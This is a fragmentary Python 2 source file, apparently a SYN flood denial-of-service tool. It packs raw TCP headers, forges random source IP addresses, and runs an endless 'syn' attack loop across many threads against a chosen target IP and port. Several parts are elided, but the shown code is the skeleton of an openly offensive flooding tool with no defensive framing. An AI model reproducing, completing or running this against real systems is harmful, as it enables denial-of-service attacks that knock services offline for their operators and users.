...
def TCP(srcip, dstip, protocol, dp, fg):
    ...
    tcplen = hlen
    h_f = (hlen << 12) + flag
    TCP_head = struct.pack("!4s4sHHHHIIHHHH", source, destination, protocol, \
                           tcplen, srcport, dstport, syn_num, ack_num, h_f, \
                           window, check, point)
...
def makepacket(dstip, dstport, fg):
    srcip = str(random.choice(ip_first)) + '.' + str(random.randint(1,255)) + '.' + \
...
def attack(dstip, dstport, mode):
    print 'Start attack %s ip: %s port: %d', mode, dstip, dstport
    if mode == 'syn':
        fg = 2
        while 1:
...
if __name__ == '__main__':
    ...
    for i in range(threads):
        threads_name[i] = synThread(dstip, dstport, mode)
